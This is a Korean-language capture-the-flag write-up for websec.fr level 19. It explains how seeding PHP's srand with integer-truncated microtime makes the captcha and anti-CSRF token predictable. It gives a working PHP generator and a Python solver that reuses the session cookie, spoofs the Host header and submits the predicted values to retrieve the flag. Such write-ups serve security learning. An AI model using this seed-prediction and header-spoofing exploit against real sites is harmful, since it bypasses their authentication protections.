---
title: Websec - Writeup
categories:
 - webhacking
tags: web, websec, php, unserialize, sqlinjection
---


## level 19

### intro

 websec captcha 우회 및 토큰 인증 및 http_host 헤더 변조 문제

 

### problem

소스를 총 4개 있는데 show_image는 안봐도 상관없었다.

사실 show_image에서 값으로 넣어주는 captcha의 값을 image파일에서 파싱해서 구하는 문제인줄 알았지만 아니였다.

취약점은 srand가 microtime에서 해당 값이 정수로 들어가서 1초 안에 같은 php 환경에서 rand값을 구해주면 정확히 똑같은 값이 나오기 때문에 발생하는 문제점이다. C언어 에서의 문제점과 같음.

 

### exploit

하나의 php서버와 하나의 python 코드를 사용해서 풀었다.

### random.php

```php
<?php

function generate_random_text ($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand () % strlen ($chars)];
    }
    return $text;
}

$current_time = microtime(true);

$current_time = $current_time - 3;
for($i = 1; $i < 6; $i++){
	
	srand($current_time+$i);
	
	echo generate_random_text(32);
	echo ' ';
	echo generate_random_text(26);
	echo '  ';
	
}

?>
```

### slv.py
```python
import requests

token = ''
captcha = ''

websec_URL = 'http://websec.fr/level19/index.php'
my_URL = 'https://ctf-mflzx.run.goorm.io/webhacking/websec/level19/random2.php'

websec_response = requests.post(websec_URL) # 한 번 연결 후 cookie값 저장 후 token 추출
cookies = {'PHPSESSID' :websec_response.cookies['PHPSESSID']}

print ('[*] cookie : %s'%cookies)
my_response = requests.post(my_URL)

real_token = websec_response.text.split('name="token" value="')[1][:32]

print('[*] Find token : %s' %real_token)

token_list = my_response.text.split(' ')

# 추출한 token과 random2.php에서 추출한 token의 값이 매칭되는 token을 찾고 captcha를 찾는다.
for i in range(len(token_list)): 
	if token_list[i] == real_token:
		token = token_list[i]
		captcha = token_list[i+1]

if token == '':
	print('[-] Can\'t find matching token & captcha')
	exit()
	
print('[+] Matching token : %s' %token)
print('[+] Matching captcha : %s' %captcha)

datas ={
		'captcha':
		captcha,
		'token':
		token
		}

headers = {'host': 'woosun.com'}

# 위에서 저장한 cookie를 넣고 http_host를 변조한 후 post sending
response = requests.post(websec_URL, headers=headers, data=datas, cookies=cookies)

if "Invalid captcha" in response.text:
	print('[-] Fail verify captcha')
	
elif 'Please sumbit the anti-csrf token.' in response.text:
	print('[-] Don\'t send token')

elif 'Invalid session token.' in response.text:
	print('[-] Fail verify token')

else:
	
	print('[+] Solving Success')
	flag = 'WEBSEC' + response.text.split('WEBSEC')[1].replace('.', '')
	print('[+] FLAG : ' + flag)
```